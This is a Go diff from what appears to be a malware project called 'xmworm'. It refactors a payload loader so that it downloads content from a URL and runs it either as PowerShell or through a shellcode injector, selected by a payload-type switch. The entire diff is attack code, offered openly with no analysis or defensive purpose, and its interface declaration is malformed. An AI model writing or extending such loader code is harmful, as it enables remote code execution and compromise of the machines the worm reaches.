@@ -5,6 +5,7 @@ import (
 	"net/http"
 	"fmt"
 	sh "github.com/0/xmworm/shell"
+	injector "github.com/0/xmworm/injector"
 	"log"
 )
 
@@ -12,11 +13,11 @@ type PayloadFetcher interface {
 	fetch() ([]byte)
 }
 
-type PasteBinPayloadFetcher struct {
+type HTTPPayloadFetcher struct {
 	url string
 }
 
-func (fetcher PasteBinPayloadFetcher) fetch() ([]byte) {
+func (fetcher HTTPPayloadFetcher) fetch() ([]byte) {
 	resp, err := http.Get(fetcher.url)
 	if err != nil {
 		// handle error
@@ -40,18 +41,44 @@ func getPayload(fetcher PayloadFetcher) (payload []byte) {
 	return
 }
 
-func executePayload(payload []byte) {
+type PayloadExecutor struct {
+	execute([]byte)
+}
+type PowershellPayloadExecutor struct {
+}
+
+func (pshexec PowershellPayloadExecutor) execute(payload []byte) {
 	err := sh.Run(string(payload), "powershell")
 	if err != nil {
 		log.Printf("Failed to execute payload. ..continue")
 	}
 }
 
-func Payload(url string) {
-	fmt.Printf("fetching payload from : %v\n", url)
-	pastebin := PasteBinPayloadFetcher{url: url}
-	fmt.Printf("pastebin: %v\n", pastebin)
-	payload := getPayload(pastebin)
+type ShellcodePayloadExecutor struct {
+}
+
+func (shcexec ShellcodePayloadExecutor) execute(payload []byte) {
+	// do something.
+	injector.Run(payload, "shellcode")
+}
+
+func Payload(payloadUrl string, payloadType string) {
+	fmt.Printf("fetching payload from : %v\n", payloadUrl)
+	httpfetcher := HTTPPayloadFetcher{url: payloadUrl}
+	fmt.Printf("pastebin: %v\n", httpfetcher)
+	payload := getPayload(httpfetcher)
 	fmt.Printf("Executing payload...\n")
-	executePayload(payload)
+
+	switch payloadType{
+	case "shellcode":
+		executor := ShellcodePayloadExecutor{}
+		executor.execute(payload)
+	case "powershell":
+		executor := PowershellPayloadExecutor{}
+		executor.execute(payload)
+	default:
+		// default is powershell
+		executor := PowershellPayloadExecutor{}
+		executor.execute(payload)
+	}
 }
